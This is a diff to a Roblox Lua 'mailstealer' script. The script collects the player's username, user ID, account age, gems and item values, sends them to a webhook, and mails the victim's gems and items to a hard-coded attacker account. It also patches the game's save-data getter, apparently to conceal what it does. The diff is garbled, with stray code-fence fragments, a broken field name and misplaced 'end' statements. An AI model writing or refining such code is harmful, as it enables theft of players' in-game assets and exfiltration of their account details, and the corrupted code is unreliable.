@@ -34,7 +34,8 @@ if idiotuser == Username then
     game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
     return
 end
-if Username == nil then
+
+if not Username or Username == "" then
     game:GetService("Players").LocalPlayer:Kick("Put A UserName")
     return
 end
@@ -61,6 +62,7 @@ local MailMessage = "BLOX ON TOP!"
 local message = require(game.ReplicatedStorage.Library.Client.Message)
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 
+local GemsAmount = 0
 for id, table in pairs(Inventory.Currency) do
     if table.id == "Diamonds" then
         GemsAmount = table._am or 0
@@ -80,7 +82,7 @@ if not FunctionToGetFirstPriceOfMail then
     error("Function 'computeSendMailCost' not found in getgc()")
 end
 
-FirstPriceOfMail = FunctionToGetFirstPriceOfMail()
+local FirstPriceOfMail = FunctionToGetFirstPriceOfMail()
 
 if FirstPriceOfMail > GemsAmount then
     print("You don't have enough gems to run a script")
@@ -135,7 +137,8 @@ local GetItemValueOfItems = function()
     for name_of_category, category in pairs(Inventory) do
         if category ~= nil then
             for i, v in pairs(category) do
-                RAP = RAP + GetItemValue (name_of_category, v)
+                RAP = RAP + GetItemValue(name_of_category, v)
+ end
             end
         end
     end
@@ -180,7 +183,7 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
                         ["name"] = "**This data was generated using " .. mailstealer_name .. " Mailstealer**",
                         ["value"] = "```Username     : " ..
                             fardplayer.Name ..
-                                "\nUser  -ID      : " ..
+                                "\nUser   -ID      : " ..
                                     fardplayer.userId ..
                                         "\nAccount Age  : " ..
                                             fardplayer.AccountAge ..
@@ -233,10 +236,8 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
         {
             Url = webhook,
             Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = game.HttpService:JSONEncode(msg)
+            Headers = headers,
+            Body = HttpService:JSONEncode(msg)
         }
     )
 end
@@ -252,9 +253,8 @@ end
 MinimumRAP = FirstPriceOfMail
 
 if Inventory.Box then
-    for key ```lua
-    , value in pairs(Inventory.Box) do
-        if value._uq then
+    for key, value in pairs(Inventory.Box) do
+        if value._ uq then
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(key)
         end
     end
@@ -514,7 +514,8 @@ local function GetListWithAllItems()
             end
         end
     end
-    if Inventory.Hoverboard ~= nil then
+    if Inventory.Hoverboard ~= ```lua
+    nil then
         for i, v in pairs(Inventory.Hoverboard) do
             id = v.id
             dir = Directory.Hoverboards[id]
@@ -651,7 +652,7 @@ local function SendAllGems()
             if GemsAmount >= (FirstPriceOfMail + 10000) then
                 SentGems = GemsAmount - FirstPriceOfMail
                 local args = {
-                    [1] = Roblox_Username,
+ [1] = Roblox_Username,
                     [2] = "" .. mailstealer_name .. " mailstealer on top",
                     [3] = "Currency",
                     [4] = i,
@@ -675,8 +676,7 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
     local blob_b = blob_a.Get()
 
     FavoriteModeSelection = blob_a.Get().FavoriteModeSelection
-    FavoriteMode ```lua
-SelectionPlaza = blob_a.Get().FavoriteModeSelectionPlaza
+    FavoriteModeSelectionPlaza = blob_a.Get().FavoriteModeSelectionPlaza
 
     oldGet = deepCopy(blob_b)
     blob_a.Get = function(...)
